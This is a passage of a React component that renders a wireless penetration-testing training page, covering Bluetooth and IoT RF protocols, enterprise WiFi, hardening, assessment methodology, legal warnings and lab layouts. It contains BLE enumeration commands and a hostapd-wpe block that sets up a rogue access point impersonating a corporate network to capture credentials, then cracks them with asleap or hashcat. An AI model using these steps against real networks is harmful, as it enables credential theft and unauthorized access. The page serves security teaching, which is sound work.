                  <TableCell>{attack.year}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Typography variant="h6" gutterBottom>Bluetooth Testing Tools</Typography>
        <Grid container spacing={2} sx={{ mb: 3 }}>
          {bluetoothTools.map((tool) => (
            <Grid item xs={12} sm={6} md={4} key={tool.name}>
              <Card variant="outlined">
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                    <Typography variant="subtitle1" fontWeight="bold">{tool.name}</Typography>
                    <Chip label={tool.platform} size="small" variant="outlined" />
                  </Box>
                  <Typography variant="body2" color="text.secondary">{tool.description}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Typography variant="h6" gutterBottom>
          <SettingsInputAntennaIcon sx={{ verticalAlign: "middle", mr: 1 }} />
          IoT RF Protocols
        </Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Protocol</strong></TableCell>
                <TableCell><strong>Frequency</strong></TableCell>
                <TableCell><strong>Common Use</strong></TableCell>
                <TableCell><strong>Security</strong></TableCell>
                <TableCell><strong>Known Vulnerabilities</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {rfProtocols.map((row) => (
                <TableRow key={row.protocol}>
                  <TableCell><Chip label={row.protocol} size="small" variant="outlined" /></TableCell>
                  <TableCell>{row.frequency}</TableCell>
                  <TableCell>{row.use}</TableCell>
                  <TableCell>{row.security}</TableCell>
                  <TableCell><Typography variant="body2" color="text.secondary">{row.vulnerabilities}</Typography></TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Software Defined Radio (SDR)</Typography>
        <Grid container spacing={2}>
          <Grid item xs={12} md={6}>
            <Card variant="outlined">
              <CardContent>
                <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                  SDR Hardware
                </Typography>
                <List dense>
                  {[
                    { device: "RTL-SDR", price: "$25-35", range: "25-1700 MHz", use: "Receive only, great for learning" },
                    { device: "HackRF One", price: "$300", range: "1-6000 MHz", use: "TX/RX, half-duplex" },
                    { device: "YARD Stick One", price: "$100", range: "Sub-1GHz", use: "Designed for ISM bands" },
                    { device: "Ubertooth One", price: "$120", range: "2.4 GHz", use: "Bluetooth-specific" },
                    { device: "Flipper Zero", price: "$170", range: "Sub-GHz + RFID + NFC", use: "All-in-one pentest device" },
                  ].map((sdr) => (
                    <ListItem key={sdr.device}>
                      <ListItemText 
                        primary={<><strong>{sdr.device}</strong> ({sdr.price})</>}
                        secondary={`${sdr.range} - ${sdr.use}`}
                      />
                    </ListItem>
                  ))}
                </List>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card variant="outlined">
              <CardContent>
                <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                  Common RF Attacks
                </Typography>
                <List dense>
                  {[
                    { attack: "Replay Attack", desc: "Record and retransmit captured signals (garage doors, car fobs)" },
                    { attack: "Jamming", desc: "Overwhelm frequency to cause denial of service" },
                    { attack: "Signal Analysis", desc: "Reverse engineer proprietary protocols" },
                    { attack: "Rolling Code Attack", desc: "Exploit weak PRNG in rolling code systems" },
                    { attack: "RollJam", desc: "Jam + capture to steal rolling codes" },
                  ].map((attack) => (
                    <ListItem key={attack.attack}>
                      <ListItemIcon><WarningIcon color="warning" fontSize="small" /></ListItemIcon>
                      <ListItemText 
                        primary={attack.attack}
                        secondary={attack.desc}
                      />
                    </ListItem>
                  ))}
                </List>
              </CardContent>
            </Card>
          </Grid>
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>BLE Pentesting Commands</Typography>
        <CodeBlock title="Bluetooth Low Energy Enumeration">{`# Scan for BLE devices (hcitool)
sudo hcitool lescan

# Scan with bettercap
sudo bettercap
> ble.recon on
> ble.show

# Connect to device and enumerate services
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics

# Read a characteristic
> char-read-hnd 0x0003

# Using bluetoothctl
bluetoothctl
> scan on
> info AA:BB:CC:DD:EE:FF
> connect AA:BB:CC:DD:EE:FF`}</CodeBlock>
      </TabPanel>

      {/* Tab 5: Enterprise */}
      <TabPanel value={tabValue} index={6}>
        <Typography variant="h5" gutterBottom>Enterprise Wireless Security</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Enterprise vs Personal WiFi</AlertTitle>
          Enterprise wireless (WPA2/WPA3-Enterprise) uses individual credentials instead of shared passwords. 
          This provides accountability, centralized management, and stronger security - but introduces new 
          attack surfaces around certificates and RADIUS authentication.
        </Alert>

        <Typography variant="h6" gutterBottom>Key Enterprise Components</Typography>
        <Grid container spacing={2} sx={{ mb: 3 }}>
          {enterpriseTopics.map((item) => (
            <Grid item xs={12} sm={6} md={3} key={item.topic}>
              <Card variant="outlined" sx={{ height: "100%", textAlign: "center" }}>
                <CardContent>
                  <Box sx={{ color: "primary.main", mb: 1 }}>{item.icon}</Box>
                  <Typography variant="subtitle1" fontWeight="bold">{item.topic}</Typography>
                  <Typography variant="body2" color="text.secondary">{item.description}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>EAP Authentication Methods</Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Method</strong></TableCell>
                <TableCell><strong>Security</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Deployment</strong></TableCell>
                <TableCell><strong>Weakness</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {eapMethods.map((row) => (
                <TableRow key={row.method}>
                  <TableCell><Chip label={row.method} size="small" variant="outlined" /></TableCell>
                  <TableCell>
                    <Chip 
                      label={row.security} 
                      size="small" 
                      color={row.security === "Highest" || row.security === "High" ? "success" : "error"}
                    />
                  </TableCell>
                  <TableCell>{row.description}</TableCell>
                  <TableCell>
                    <Chip 
                      label={row.deployment} 
                      size="small" 
                      variant="outlined"
                      color={row.deployment === "Easy" ? "success" : row.deployment === "Medium" ? "warning" : "error"}
                    />
                  </TableCell>
                  <TableCell><Typography variant="body2" color="text.secondary">{row.vulnerability}</Typography></TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Typography variant="h6" gutterBottom>Enterprise Attack Vectors</Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Attack</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Difficulty</strong></TableCell>
                <TableCell><strong>Impact</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {enterpriseAttacks.map((row) => (
                <TableRow key={row.attack}>
                  <TableCell>
                    <Typography variant="subtitle2" fontWeight="bold" color="error">{row.attack}</Typography>
                  </TableCell>
                  <TableCell>{row.description}</TableCell>
                  <TableCell>
                    <Chip label={row.difficulty} size="small" color={row.difficulty === "Easy" ? "success" : row.difficulty === "Medium" ? "warning" : "error"} />
                  </TableCell>
                  <TableCell>
                    <Chip label={row.impact} size="small" variant="outlined" color={row.impact === "Critical" ? "error" : row.impact === "High" ? "warning" : "info"} />
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Enterprise Attack: hostapd-wpe</Typography>
        <Typography paragraph>
          The most common enterprise wireless attack uses <strong>hostapd-wpe</strong> (Wireless Pwnage Edition) 
          to create a rogue access point that impersonates the corporate network and captures user credentials.
        </Typography>
        <CodeBlock title="hostapd-wpe Setup">{`# Install hostapd-wpe
sudo apt install hostapd-wpe

# Edit configuration
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf

# Key settings:
# interface=wlan0
# ssid=CorporateWiFi
# channel=6
# eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# Start the rogue AP
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials appear in hostapd-wpe.log
# Format: username:NETNTLM_CHALLENGE:NETNTLM_RESPONSE

# Crack MSCHAPv2 with asleap
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# Or convert to hashcat format and use GPU
# hashcat -m 5500 hash.txt wordlist.txt`}</CodeBlock>

        <Alert severity="warning" sx={{ mt: 2 }}>
          <AlertTitle>Defense: Certificate Validation</AlertTitle>
          The primary defense against enterprise evil twin attacks is proper certificate validation on 
          client devices. If users are trained to "accept anyway" or devices don't validate the RADIUS 
          server certificate, this attack will succeed.
        </Alert>
      </TabPanel>

      {/* Tab 6: Defense */}
      <TabPanel value={tabValue} index={7}>
        <Typography variant="h5" gutterBottom>Wireless Defense & Hardening</Typography>
        
        <Alert severity="success" sx={{ mb: 3 }}>
          <AlertTitle>Defense in Depth</AlertTitle>
          Effective wireless security requires multiple layers: strong encryption, network segmentation, 
          continuous monitoring, and regular assessments. No single control is sufficient.
        </Alert>

        <Typography variant="h6" gutterBottom>Defense Strategies by Priority</Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Priority</strong></TableCell>
                <TableCell><strong>Strategy</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Implementation</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {defenseStrategies.map((row) => (
                <TableRow key={row.strategy}>
                  <TableCell>
                    <Chip 
                      label={row.priority} 
                      size="small" 
                      color={row.priority === "Critical" ? "error" : row.priority === "High" ? "warning" : "info"}
                    />
                  </TableCell>
                  <TableCell>
                    <Typography variant="subtitle2" fontWeight="bold">{row.strategy}</Typography>
                  </TableCell>
                  <TableCell>{row.description}</TableCell>
                  <TableCell>
                    <Typography variant="body2" color="text.secondary">{row.implementation}</Typography>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Implementation Guide</Typography>
        <Grid container spacing={2}>
          <Grid item xs={12} md={6}>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">WPA3 Migration</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <List dense>
                  <ListItem><ListItemText primary="â€¢ Audit current AP and client WPA3 support" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Enable WPA3-Transition mode initially" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Test with modern and legacy devices" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Disable WPA2 once all clients support WPA3" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Enable Protected Management Frames (PMF)" /></ListItem>
                </List>
              </AccordionDetails>
            </Accordion>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Network Segmentation</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <List dense>
                  <ListItem><ListItemText primary="â€¢ Create separate VLANs for IoT, Guest, Corporate" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Implement firewall rules between segments" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Use SSIDs mapped to appropriate VLANs" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Monitor inter-VLAN traffic for anomalies" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Isolate client devices from each other" /></ListItem>
                </List>
              </AccordionDetails>
            </Accordion>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Certificate Management</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <List dense>
                  <ListItem><ListItemText primary="â€¢ Deploy certificates via MDM/GPO" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Configure clients to validate server cert" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Use private CA with proper chain" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Set certificate expiration alerts" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Prevent users from bypassing validation" /></ListItem>
                </List>
              </AccordionDetails>
            </Accordion>
          </Grid>
          <Grid item xs={12} md={6}>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">WIDS/WIPS Deployment</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <List dense>
                  <ListItem><ListItemText primary="â€¢ Deploy dedicated sensors or use AP-based" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Configure rogue AP detection thresholds" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Enable deauth attack detection" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Alert on evil twin/SSID spoofing" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Integrate with SIEM for correlation" /></ListItem>
                </List>
              </AccordionDetails>
            </Accordion>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Strong Password Policy</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <List dense>
                  <ListItem><ListItemText primary="â€¢ Minimum 20+ character passphrase for PSK" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Rotate PSK quarterly (or use Enterprise)" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Never reuse passwords across networks" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Avoid dictionary words and patterns" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Consider SAE (WPA3) for forward secrecy" /></ListItem>
                </List>
              </AccordionDetails>
            </Accordion>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Monitoring & Response</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <List dense>
                  <ListItem><ListItemText primary="â€¢ Log all authentication attempts" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Alert on repeated auth failures" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Monitor for new/unexpected SSIDs" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Track unusual data volumes" /></ListItem>
                  <ListItem><ListItemText primary="â€¢ Establish IR playbook for wireless incidents" /></ListItem>
                </List>
              </AccordionDetails>
            </Accordion>
          </Grid>
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Best Practices by Environment</Typography>
        <Grid container spacing={2}>
          {[
            { env: "Home Networks", icon: <HomeIcon />, tips: ["Use WPA3 if supported", "Strong unique 20+ char password", "Disable WPS completely", "Regular firmware updates", "Change default admin creds"] },
            { env: "Small Business", icon: <BusinessIcon />, tips: ["Separate guest network (VLAN)", "Consider WPA2/3-Enterprise", "Enable AP client isolation", "Regular security audits", "Strong PSK rotation quarterly"] },
            { env: "Enterprise", icon: <RouterIcon />, tips: ["802.1X with EAP-TLS certificates", "Wireless IDS/IPS deployment", "NAC integration mandatory", "Regular penetration testing", "Zero-trust network architecture"] },
          ].map((item) => (
            <Grid item xs={12} md={4} key={item.env}>
              <Card sx={{ height: "100%" }}>
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                    {item.icon}
                    <Typography variant="h6">{item.env}</Typography>
                  </Box>
                  <List dense>
                    {item.tips.map((tip) => (
                      <ListItem key={tip}>
                        <ListItemIcon><ShieldIcon fontSize="small" color="success" /></ListItemIcon>
                        <ListItemText primary={tip} />
                      </ListItem>
                    ))}
                  </List>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Quick Hardening Checklist</Typography>
        <Grid container spacing={2}>
          {[
            { item: "WPA3 or WPA2-Enterprise with AES", status: "Required" },
            { item: "Disable WPS completely", status: "Required" },
            { item: "Change default admin credentials", status: "Required" },
            { item: "Enable client isolation on guest networks", status: "Required" },
            { item: "Implement MAC filtering (layered defense)", status: "Recommended" },
            { item: "Regular firmware updates", status: "Required" },
            { item: "Disable unused management interfaces", status: "Required" },
            { item: "Deploy WIDS/WIPS sensors", status: "Recommended" },
          ].map((check) => (
            <Grid item xs={12} sm={6} md={3} key={check.item}>
              <Card variant="outlined">
                <CardContent sx={{ py: 1, "&:last-child": { pb: 1 } }}>
                  <Chip 
                    label={check.status} 
                    size="small" 
                    color={check.status === "Required" ? "error" : check.status === "Recommended" ? "warning" : "default"}
                    sx={{ mb: 1 }}
                  />
                  <Typography variant="body2">{check.item}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </TabPanel>

      {/* Tab 7: Methodology */}
      <TabPanel value={tabValue} index={8}>
        <Typography variant="h5" gutterBottom>Wireless Pentest Methodology</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Professional Wireless Assessments</AlertTitle>
          A structured methodology ensures comprehensive coverage, reproducible results, and professional 
          deliverables. Each phase builds on the previous, creating a thorough assessment of wireless security posture.
        </Alert>

        <Typography variant="h6" gutterBottom>Testing Phases</Typography>
        <Stepper orientation="vertical" sx={{ mb: 3 }}>
          {[
            { 
              phase: "1. Planning & Scoping", 
              tasks: ["Define scope and rules of engagement", "Identify target networks and physical locations", "Obtain written authorization and legal review", "Prepare equipment and verify functionality", "Establish communication channels with client"],
              time: "1-2 days",
              output: "Scope document, authorization letter"
            },
            { 
              phase: "2. Reconnaissance", 
              tasks: ["Passive scanning from multiple locations", "Identify SSIDs, BSSIDs, channels, vendors", "Map network topology and coverage areas", "Identify security protocols in use", "Note client devices and traffic patterns"],
              time: "1-2 days",
              output: "Network inventory, coverage map"
            },
            { 
              phase: "3. Vulnerability Analysis", 
              tasks: ["Identify weak protocols (WEP, WPS enabled)", "Check for misconfigurations and default settings", "Assess encryption strength and implementation", "Identify rogue/unauthorized APs", "Review enterprise auth configuration"],
              time: "1-2 days",
              output: "Vulnerability list, risk assessment"
            },
            { 
              phase: "4. Exploitation", 
              tasks: ["Attempt authorized attacks per scope", "Capture and crack handshakes", "Test evil twin scenarios (if authorized)", "Verify vulnerabilities are exploitable", "Document proof of concept for each finding"],
              time: "2-4 days",
              output: "Attack logs, screenshots, captures"
            },
            { 
              phase: "5. Post-Exploitation", 
              tasks: ["Assess network access gained", "Identify pivot points and lateral movement", "Document access level achieved", "Test client-side attacks if in scope", "Assess data exposure risk"],
              time: "1-2 days",
              output: "Access documentation, risk analysis"
            },
            { 
              phase: "6. Reporting", 
              tasks: ["Document all findings with evidence", "Assign risk ratings (CVSS or custom)", "Provide specific remediation steps", "Create executive summary for management", "Conduct findings walkthrough with client"],
              time: "2-3 days",
              output: "Final report, executive summary"
            },
          ].map((item, idx) => (
            <Step key={item.phase} active completed={false}>
              <StepLabel>
                <Typography variant="subtitle1" fontWeight="bold">{item.phase}</Typography>
              </StepLabel>
              <StepContent>
                <Box sx={{ pl: 2 }}>
                  <List dense>
                    {item.tasks.map((task) => (
                      <ListItem key={task} sx={{ py: 0 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}><SpeedIcon fontSize="small" /></ListItemIcon>
                        <ListItemText primary={task} />
                      </ListItem>
                    ))}
                  </List>
                  <Box sx={{ display: "flex", gap: 2, mt: 1 }}>
                    <Chip label={`Time: ${item.time}`} size="small" variant="outlined" />
                    <Chip label={`Output: ${item.output}`} size="small" color="primary" variant="outlined" />
                  </Box>
                </Box>
              </StepContent>
            </Step>
          ))}
        </Stepper>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Certifications & Training</Typography>
        <TableContainer component={Paper} sx={{ mb: 3 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Certification</strong></TableCell>
                <TableCell><strong>Organization</strong></TableCell>
                <TableCell><strong>Focus</strong></TableCell>
                <TableCell><strong>Difficulty</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {certifications.map((row) => (
                <TableRow key={row.cert}>
                  <TableCell><Chip label={row.cert} size="small" color="primary" /></TableCell>
                  <TableCell>{row.org}</TableCell>
                  <TableCell><Chip label={row.focus} size="small" variant="outlined" /></TableCell>
                  <TableCell>
                    <Chip 
                      label={row.difficulty} 
                      size="small" 
                      color={row.difficulty === "Entry" ? "success" : row.difficulty === "Intermediate" ? "warning" : "error"}
                    />
                  </TableCell>
                  <TableCell>{row.description}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Legal Considerations</Typography>
        <Alert severity="error" sx={{ mb: 3 }}>
          <AlertTitle>âš ï¸ Critical: Always Get Written Authorization</AlertTitle>
          <Typography paragraph>
            Wireless penetration testing without explicit authorization is a criminal offense in most jurisdictions. 
            Even with good intentions, you could face serious legal consequences.
          </Typography>
        </Alert>
        
        <Grid container spacing={2} sx={{ mb: 3 }}>
          {[
            { 
              title: "Computer Fraud Laws", 
              icon: <WarningIcon color="error" />,
              items: ["CFAA (US), Computer Misuse Act (UK)", "Unauthorized access is a federal crime", "Can include civil and criminal penalties", "Intent doesn't matter - access is the crime"]
            },
            { 
              title: "FCC Regulations (US)", 
              icon: <WarningIcon color="error" />,
              items: ["Intentional interference is illegal", "Deauth attacks may violate Part 15", "Jamming is a federal offense", "Heavy fines and equipment seizure possible"]
            },
            { 
              title: "Authorization Requirements", 
              icon: <CheckCircleIcon color="success" />,
              items: ["Get written scope document", "Specify allowed attack types", "Define physical boundaries", "Include indemnification clause"]
            },
            { 
              title: "Signal Boundaries", 
              icon: <WarningIcon color="warning" />,
              items: ["Wireless signals don't respect walls", "May affect neighboring businesses", "Consider off-hours testing", "Document signal reach limitations"]
            },
          ].map((section) => (
            <Grid item xs={12} sm={6} md={3} key={section.title}>
              <Card variant="outlined" sx={{ height: "100%" }}>
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    {section.icon}
                    <Typography variant="subtitle2" fontWeight="bold">{section.title}</Typography>
                  </Box>
                  <List dense>
                    {section.items.map((item) => (
                      <ListItem key={item} sx={{ py: 0 }}>
                        <ListItemText primary={<Typography variant="body2">â€¢ {item}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Building a Practice Lab</Typography>
        <Grid container spacing={2}>
          <Grid item xs={12} md={6}>
            <Card variant="outlined">
              <CardContent>
                <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                  Minimum Lab Setup
                </Typography>
                <List dense>
                  {[
                    { item: "Old router (WEP/WPA capable)", purpose: "Target for cracking exercises" },
                    { item: "Monitor mode adapter", purpose: "Atheros AR9271 or similar ($15-25)" },
                    { item: "Kali Linux VM or bare metal", purpose: "Attack platform with tools pre-installed" },
                    { item: "Spare laptop/phone as client", purpose: "Generate traffic and test client attacks" },
                    { item: "Faraday bag (optional)", purpose: "Contain signals to prevent interference" },
                  ].map((item) => (
                    <ListItem key={item.item}>
                      <ListItemText 
                        primary={<strong>{item.item}</strong>}
                        secondary={item.purpose}
                      />
                    </ListItem>
                  ))}
                </List>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} md={6}>
            <Card variant="outlined">
              <CardContent>
                <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                  Practice Resources
                </Typography>
                <List dense>
                  {[
                    { resource: "WiFi Pineapple", desc: "Hardware lab platform with training mode" },
                    { resource: "Hack The Box", desc: "Some machines have wireless components" },
                    { resource: "PentesterLab", desc: "Web-based exercises including wireless" },
                    { resource: "WiFi Challenge Labs", desc: "Dedicated wireless CTF-style challenges" },
                    { resource: "Your own home network", desc: "Legal to test your own equipment" },
                  ].map((item) => (
                    <ListItem key={item.resource}>
                      <ListItemText 
                        primary={<strong>{item.resource}</strong>}
                        secondary={item.desc}
                      />
                    </ListItem>
                  ))}
                </List>
              </CardContent>
            </Card>
          </Grid>
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Report Template Sections</Typography>
        <Grid container spacing={2}>
          {[
            { section: "Executive Summary", items: ["High-level findings for management", "Business risk assessment", "Key recommendations prioritized"] },
            { section: "Scope & Methodology", items: ["Networks tested and locations", "Attack types performed", "Tools and techniques used"] },
            { section: "Findings Detail", items: ["Vulnerability description", "Proof of concept with screenshots", "CVSS or risk rating", "Specific remediation steps"] },
            { section: "Appendices", items: ["Full scan results", "Captured handshakes (sanitized)", "Timeline of testing", "Tool output logs"] },
          ].map((item) => (
            <Grid item xs={12} sm={6} md={3} key={item.section}>
              <Card variant="outlined" sx={{ height: "100%" }}>
                <CardContent>
                  <Typography variant="subtitle2" fontWeight="bold" color="primary" gutterBottom>
                    {item.section}
                  </Typography>
                  <List dense>
                    {item.items.map((i) => (
                      <ListItem key={i} sx={{ py: 0 }}>
                        <ListItemText primary={<Typography variant="body2">â€¢ {i}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </TabPanel>

      {/* Tab 8: Labs */}
      <TabPanel value={tabValue} index={9}>
        <Typography variant="h5" gutterBottom>Hands-On Lab Exercises</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Practice Makes Perfect</AlertTitle>
          These labs are designed for your own equipment or authorized test environments. 
          <strong> Never practice on networks you don't own or have explicit permission to test.</strong>
        </Alert>

        {/* Comprehensive Detailed Labs Section */}
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, mt: 4 }}>
          <ScienceIcon color="primary" />
          Comprehensive Lab Walkthroughs
        </Typography>
        <Typography paragraph color="text.secondary">
          Complete step-by-step guides with network diagrams, commands, verification steps, and troubleshooting.
          Each lab builds on fundamentals to develop real-world wireless pentesting skills.
        </Typography>

        {comprehensiveLabExercises.map((lab) => (
          <Accordion key={lab.id} sx={{ mb: 2 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%", flexWrap: "wrap" }}>
                <Avatar sx={{ bgcolor: lab.difficulty === "Beginner" ? "success.main" : lab.difficulty === "Intermediate" ? "warning.main" : "error.main" }}>
                  {lab.id}
                </Avatar>
                <Box sx={{ flexGrow: 1 }}>
                  <Typography fontWeight="bold">{lab.title}</Typography>
                  <Typography variant="body2" color="text.secondary">{lab.category} â€¢ {lab.duration}</Typography>
                </Box>
                <Chip 
                  label={lab.difficulty} 
                  size="small" 
                  color={lab.difficulty === "Beginner" ? "success" : lab.difficulty === "Intermediate" ? "warning" : "error"} 
                />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="info" sx={{ mb: 3 }}>
                <AlertTitle>Objective</AlertTitle>
                {lab.description}
              </Alert>

              {/* Prerequisites */}
              <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                ğŸ“‹ Prerequisites
              </Typography>
              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 2 }}>
                {lab.prerequisites.map((prereq, idx) => (
                  <Chip key={idx} label={prereq} size="small" variant="outlined" />
                ))}
              </Box>

              {/* Equipment */}
              <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                ğŸ”§ Equipment Required
              </Typography>
              <Grid container spacing={1} sx={{ mb: 3 }}>
                {lab.equipment.map((equip, idx) => (
                  <Grid item xs={12} sm={6} key={idx}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      {equip.required ? (
                        <CheckCircleIcon color="success" fontSize="small" />
                      ) : (
                        <InfoIcon color="info" fontSize="small" />
                      )}
                      <Typography variant="body2">
                        {equip.item}
                        {!equip.required && <Chip label="Optional" size="small" sx={{ ml: 1 }} />}
                      </Typography>
                    </Box>
                  </Grid>
                ))}
              </Grid>

              {/* Network Diagram */}
              <Typography variant="subtitle1" fontWeight="bold" color="secondary" gutterBottom>
                ğŸ—ºï¸ Network Diagram
              </Typography>
              <Paper sx={{ p: 2, bgcolor: "grey.900", overflow: "auto", mb: 3 }}>
                <Typography
                  component="pre"
                  sx={{
                    fontFamily: "monospace",
                    fontSize: "0.7rem",
                    lineHeight: 1.2,
                    color: "success.light",
                    whiteSpace: "pre",
                    m: 0,
                  }}
                >
                  {lab.networkDiagram}
                </Typography>
              </Paper>

              {/* Steps */}
              <Typography variant="subtitle1" fontWeight="bold" color="primary" gutterBottom>
                ğŸ“ Step-by-Step Instructions
              </Typography>
              <Stepper orientation="vertical" sx={{ mb: 3 }}>
                {lab.steps.map((step) => (
                  <Step key={step.step} active expanded>
                    <StepLabel>
                      <Typography fontWeight="bold">{step.title}</Typography>
                    </StepLabel>
                    <StepContent>
                      {step.commands.length > 0 && (
                        <Paper sx={{ p: 2, bgcolor: "grey.900", mb: 2, overflow: "auto" }}>
                          {step.commands.map((cmd, cidx) => (
                            <Typography 
                              key={cidx} 
                              variant="body2" 
                              fontFamily="monospace" 
                              color={cmd.startsWith("#") ? "grey.500" : "success.light"}
                              sx={{ fontSize: "0.8rem" }}
                            >
                              {cmd || "\u00A0"}
                            </Typography>
                          ))}
                        </Paper>
                      )}
                      <Alert severity="success" sx={{ mb: 1 }}>
                        <strong>Verification:</strong> {step.verification}
                      </Alert>
